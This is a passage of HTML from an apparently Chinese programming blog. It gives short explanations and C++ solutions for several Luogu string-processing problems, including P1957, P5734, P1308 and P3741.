class="keyword">if</span> (max &lt; arr[i])</span><br><span class="line">&#123;</span><br><span class="line">max = arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (min &gt; arr[i] &amp;&amp; arr[i] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="type">int</span> res = max - min;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">1</span> || res == <span class="number">0</span>)flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i*i &lt;= res; i++) </span><br><span class="line"><span class="keyword">if</span> (res % i == <span class="number">0</span>) &#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Lucky Word&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;No Answer&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;0&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1957-口算练习题"><a href="#P1957-口算练习题" class="headerlink" title="P1957 口算练习题"></a>P1957 口算练习题</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514230917944.png" alt="image-20240514230917944"></p><p>这里我们需要对输出计算长度，因此采用<code>cstdio</code>的<code>sprintf</code>将格式化输出写入一个字符串，然后计算字符串长度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span>    <span class="comment">//sprintf</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span>   <span class="comment">//strlen</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fuhao;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">switch</span> (fuhao)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="built_in">sprintf</span>(buffer,<span class="string">&quot;%d+%d=%d&quot;</span>, i, j, i + j);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%d-%d=%d&quot;</span>, i, j, i - j);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">        <span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%d*%d=%d&quot;</span>, i, j, i * j);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">    cout &lt;&lt; buffer &lt;&lt; endl &lt;&lt; len &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    cin &gt;&gt; num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (num--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> ss[<span class="number">20</span>];<span class="comment">//这里采用字符串的原因是输入整数可能大于255</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,ss);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalpha</span>(ss[<span class="number">0</span>]))     <span class="comment">//注意isalpha参数要求为char</span></span><br><span class="line">        &#123;</span><br><span class="line">            fuhao = ss[<span class="number">0</span>];</span><br><span class="line">            cin &gt;&gt; i &gt;&gt; j;</span><br><span class="line">            <span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            i = <span class="built_in">atoi</span>(ss);</span><br><span class="line">            cin &gt;&gt; j;</span><br><span class="line">            <span class="built_in">print</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P5015-NOIP2018-普及组-标题统计"><a href="#P5015-NOIP2018-普及组-标题统计" class="headerlink" title="P5015 [NOIP2018 普及组] 标题统计"></a>P5015 [NOIP2018 普及组] 标题统计</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514232058050.png" alt="image-20240514232058050"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string str;</span><br><span class="line">    <span class="built_in">getline</span>(cin, str);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="type">char</span>&amp; ch : str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalnum</span>(ch)) count++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; count &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P5734-【深基6-例6】文字处理软件"><a href="#P5734-【深基6-例6】文字处理软件" class="headerlink" title="P5734 【深基6.例6】文字处理软件"></a>P5734 【深基6.例6】文字处理软件</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240515124114479.png" alt="image-20240515124114479"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    cin &gt;&gt; num;</span><br><span class="line">    string str;</span><br><span class="line">    cin &gt;&gt; str;</span><br><span class="line">    string tmpstr;</span><br><span class="line">    <span class="type">int</span> a, b, pos;</span><br><span class="line">    <span class="keyword">while</span> (num--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> tmp;</span><br><span class="line">      </span><br><span class="line">        cin &gt;&gt; tmp;</span><br><span class="line">        <span class="keyword">switch</span> (tmp)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        &#123;</span><br><span class="line">          </span><br><span class="line">            cin &gt;&gt; tmpstr;</span><br><span class="line">            str += tmpstr;</span><br><span class="line">            cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        &#123;</span><br><span class="line">           </span><br><span class="line">            cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">            str = str.<span class="built_in">substr</span>(a, b);</span><br><span class="line">            cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        &#123;</span><br><span class="line">          </span><br><span class="line">           </span><br><span class="line">            cin &gt;&gt; pos &gt;&gt; tmpstr;</span><br><span class="line">            str.<span class="built_in">insert</span>(pos, tmpstr);</span><br><span class="line">            cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        &#123;</span><br><span class="line">           </span><br><span class="line">            cin &gt;&gt; tmpstr;</span><br><span class="line">         </span><br><span class="line">            <span class="keyword">if</span> ((pos = str.<span class="built_in">find</span>(tmpstr)) == string::npos)</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;-1&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cout &lt;&lt; pos &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P1308-NOIP2011-普及组-统计单词数"><a href="#P1308-NOIP2011-普及组-统计单词数" class="headerlink" title="P1308 [NOIP2011 普及组] 统计单词数"></a>P1308 [NOIP2011 普及组] 统计单词数</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240515230015899.png" alt="image-20240515230015899"></p><p>这里由于不区分大小写，我们可以将字符串都转化为小写进行比较，这里使用<code>algorithm</code>的<code>std::transform</code>。然后逐步查找字符串。考虑到查找的是单个单词，我们在原字符串中插入空格，这样我们只需在匹配字符串中左右加入空格即可完成匹配。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string s1, s2;</span><br><span class="line"></span><br><span class="line">    cin &gt;&gt; s1;</span><br><span class="line">    cin.<span class="built_in">ignore</span>();</span><br><span class="line">    <span class="built_in">getline</span>(cin,s2);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    <span class="built_in">transform</span>(s<span class="number">1.</span><span class="built_in">begin</span>(), s<span class="number">1.</span><span class="built_in">end</span>(), s<span class="number">1.</span><span class="built_in">begin</span>(), ::tolower);</span><br><span class="line">    <span class="built_in">transform</span>(s<span class="number">2.</span><span class="built_in">begin</span>(), s<span class="number">2.</span><span class="built_in">end</span>(), s<span class="number">2.</span><span class="built_in">begin</span>(), ::tolower);</span><br><span class="line"></span><br><span class="line">    s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">0</span>,<span class="number">1</span>, <span class="string">&#x27; &#x27;</span>);   <span class="comment">//在0插入1个空格</span></span><br><span class="line">    s2 += <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27; &#x27;</span>);   <span class="comment">//在0插入1个空格</span></span><br><span class="line">    s1 += <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (s<span class="number">2.f</span>ind(s1) == string::npos)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;-1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((pos = s<span class="number">2.f</span>ind(s1,pos)) != string::npos)</span><br><span class="line">        &#123;</span><br><span class="line">            count++;</span><br><span class="line">            pos += s<span class="number">1.l</span>ength() - <span class="number">2</span>;<span class="comment">// 由于pos是字符串开始的位置，我们可以加上字符串长度(注意要减两个空格)，以减少查找范围</span></span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; count &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; s<span class="number">2.f</span>ind(s1)  &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P1765-手机"><a href="#P1765-手机" class="headerlink" title="P1765 手机"></a>P1765 手机</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240530090202946.png" alt="image-20240530090202946"></p><p>这里我们使用<code>unordered_map</code>来实现键值对的查找。题解中有用输入减去<code>a</code>取数组对应的值，相对更简便写。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; map =</span><br><span class="line">&#123;</span><br><span class="line">    &#123;<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>&#125;, &#123;<span class="string">&#x27;d&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;e&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;f&#x27;</span>, <span class="number">3</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;g&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;h&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;i&#x27;</span>, <span class="number">3</span>&#125;, &#123;<span class="string">&#x27;j&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;k&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;l&#x27;</span>, <span class="number">3</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;m&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;n&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;o&#x27;</span>, <span class="number">3</span>&#125;, &#123;<span class="string">&#x27;p&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;q&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;r&#x27;</span>, <span class="number">3</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;s&#x27;</span>, <span class="number">4</span>&#125;, &#123;<span class="string">&#x27;t&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;u&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;v&#x27;</span>, <span class="number">3</span>&#125;, &#123;<span class="string">&#x27;w&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;x&#x27;</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;y&#x27;</span>, <span class="number">3</span>&#125;, &#123;<span class="string">&#x27;z&#x27;</span>, <span class="number">4</span>&#125;, &#123;<span class="string">&#x27; &#x27;</span>, <span class="number">1</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string s1;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">getline</span>(cin, s1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> <span class="type">char</span>&amp; tmp : s1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.<span class="built_in">find</span>(tmp) != map.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            count += map[tmp];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P3741-小果的键盘"><a href="#P3741-小果的键盘" class="headerlink" title="P3741 小果的键盘"></a>P3741 小果的键盘</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240516170245784.png" alt="image-20240516170245784"></p><p>这题能达成<code>KV</code>条件有两种方式：</p><ol><li>原字符串就是<code>KV</code></li><li>通过修改<code>KK</code>或<code>VV</code>来产生一个<code>KV</code>，这里<code>KK</code>和<code>VV</code>不能是原字符串的一部分，如：<code>KKV</code>若修改为<code>KVV</code>，原字符串数量反而未增加。</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((pos = s.<span class="built_in">find</span>(<span class="string">&quot;VK&quot;</span>, pos)) != string::npos)</span><br><span class="line">    &#123;</span><br><span class="line">        s[pos] = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">        s[pos + <span class="number">1</span>] = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">        count++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">find</span>(<span class="string">&quot;KK&quot;</span>) != string::npos || s.<span class="built_in">find</span>(<span class="string">&quot;VV&quot;</span>) != string::npos)</span><br><span class="line">    &#123;</span><br><span class="line">      </span><br><span class="line">        cout &lt;&lt; ++count &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">    cout &lt;&lt; count &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1321-单词覆盖还原"><a href="#P1321-单词覆盖还原" class="headerlink" title="P1321 单词覆盖还原"></a>P1321 单词覆盖还原</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240516180146447.png" alt="image-20240516180146447"></p><p>这题我原本思路是计算各个字符被遮盖的次数，但是怎么可能每次遮盖的都是该字符呢。。。</p><p>我们可以采用找该字符串特征值的方式：我们知道，虽然<code>boy</code>和<code>girl</code>互相被遮挡，但是字符串中的顺序是不会变的，而且两字符串无重复值，只需检测出一个字符符合序列即可判定。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string in, boy = <span class="string">&quot;boy&quot;</span>, girl = <span class="string">&quot;girl&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> boycount = <span class="number">0</span>, girlcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    cin &gt;&gt; in;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; in.<span class="built_in">length</span>() - <span class="number">2</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> (in[i] == boy[<span class="number">0</span>] || in[i + <span class="number">1</span>] == boy[<span class="number">1</span>] || in[i + <span class="number">2</span>] == boy[<span class="number">2</span>])</span><br><span class="line">            boycount++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; in.<span class="built_in">length</span>() - <span class="number">3</span>; i++)</span><br><span class="line">    <span class="keyword">if</span> (in[i] == girl[<span class="number">0</span>] || in[i + <span class="number">1</span>] == girl[<span class="number">1</span>] || in[i + <span class="number">2</span>] == girl[<span class="number">2</span>] || in[i + <span class="number">3</span>] == girl[<span class="number">3</span>])</span><br><span class="line">        girlcount++;</span><br><span class="line">    cout &lt;&lt; boycount &lt;&lt; endl &lt;&lt; girlcount &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1553-数字反转（升级版）"><a href="#P1553-数字反转（升级版）" class="headerlink" title="P1553 数字反转（升级版）"></a>P1553 数字反转（升级版）</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240516180425589.png" alt="image-20240516180425589"></p><p>这里使用string库中的<code>erase() reverse()  find_first_not_of()   find_last_not_of()</code>这几个stl函数来实现.</p><p>这里要注意的是小数部分前面是可以有0的.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 